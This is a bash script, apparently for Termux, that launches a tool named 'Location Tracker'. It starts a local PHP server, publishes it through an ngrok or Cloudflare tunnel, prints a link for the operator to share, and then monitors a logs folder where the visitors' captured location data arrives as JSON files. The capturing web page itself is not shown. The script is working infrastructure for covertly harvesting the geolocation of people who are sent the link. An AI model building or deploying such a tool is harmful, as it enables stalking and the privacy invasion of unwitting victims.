#!/bin/bash

# ========== Colors ==========
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
reset='\e[0m'

# ========== Required Packages ==========
echo -e "${yellow}[+] Checking & Installing required packages...${reset}"
pkgs=(php wget figlet inotify-tools unzip curl jq)
for pkg in "${pkgs[@]}"; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo -e "${cyan}Installing $pkg...${reset}"
        pkg install $pkg -y >/dev/null 2>&1
    fi
done

# ========== Install lolcat for colorful banner ==========
if ! command -v lolcat >/dev/null 2>&1; then
    echo -e "${cyan}[+] Installing lolcat...${reset}"
    pkg install ruby -y >/dev/null 2>&1
    gem install lolcat >/dev/null 2>&1
fi

# ========== Install Ngrok ==========
if ! command -v ngrok >/dev/null 2>&1; then
    echo -e "${cyan}[+] Installing Ngrok...${reset}"
    wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.zip >/dev/null 2>&1
    unzip ngrok-stable-linux-arm.zip >/dev/null 2>&1
    chmod +x ngrok
    mv ngrok /data/data/com.termux/files/usr/bin/
    rm ngrok-stable-linux-arm.zip
fi

# ========== Ngrok Auth Token ==========
if [ ! -f ~/.config/ngrok/ngrok.yml ]; then
    echo -ne "${yellow}[!] Enter your Ngrok Auth Token: ${reset}"
    read token
    ngrok config add-authtoken $token
fi

# ========== Start Banner ==========
clear

figlet "LOCATION" | lolcat
sleep 0.5
figlet "TRACKER" | lolcat
sleep 0.5
echo -e "${cyan}==============================================${reset}"
echo -e "${green}   Created By: Safi Khan | Location Tracker${reset}"
echo -e "${cyan}==============================================${reset}\n"

# ========== Tunnel Options ==========
echo -e "${yellow}[+] Choose Tunnel Option:${reset}"
echo -e "${green}1) Localhost (default)${reset}"
echo -e "${cyan}2) Cloudflared${reset}"
echo -e "${magenta}3) Ngrok${reset}"
echo -ne "${yellow}Enter your choice [1-3]: ${reset}"
read opt
opt=${opt:-1}

# ========== Start PHP Server ==========
echo -e "${yellow}[+] Starting PHP Server on :8080${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 >/dev/null 2>&1 &
sleep 2

# ========== Tunnel Setup ==========
link=""
if [[ $opt == 2 ]]; then
    echo -e "${cyan}[+] Launching Cloudflared Tunnel...${reset}"
    killall cloudflared >/dev/null 2>&1
    cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
    sleep 4
    for i in {1..15}; do
        link=$(grep -o 'https://[-0-9a-zA-Z.]*\.trycloudflare.com' .clflog | head -n1)
        [[ -n "$link" ]] && break
        sleep 1
    done
elif [[ $opt == 3 ]]; then
    echo -e "${cyan}[+] Launching Ngrok Tunnel...${reset}"
    killall ngrok >/dev/null 2>&1
    ngrok http 8080 > /dev/null 2>&1 &
    sleep 4
    for i in {1..15}; do
        link=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
        [[ "$link" != "null" && -n "$link" ]] && break
        sleep 1
    done
else
    link="http://localhost:8080"
fi

# ========== Final Link ==========
if [[ -z "$link" ]]; then
    echo -e "${red}[-] Tunnel failed. Check internet or Ngrok/Auth setup.${reset}"
    exit 1
fi

echo -e "${green}[+] Share this link:${reset} $link"

# ========== Monitor ==========
echo -e "${yellow}[+] Monitoring location logs...${reset}"
echo -e "${cyan}[+] Press Ctrl+C to stop monitoring${reset}"

while true; do
    new_file=$(inotifywait -e create --format '%f' logs 2>/dev/null)
    if [[ "$new_file" == *.json ]]; then
        echo -e "${green}[+] New location captured:${reset} logs/$new_file"
        echo -e "${cyan}Location details:${reset}"
        jq '.' "logs/$new_file"
    fi
done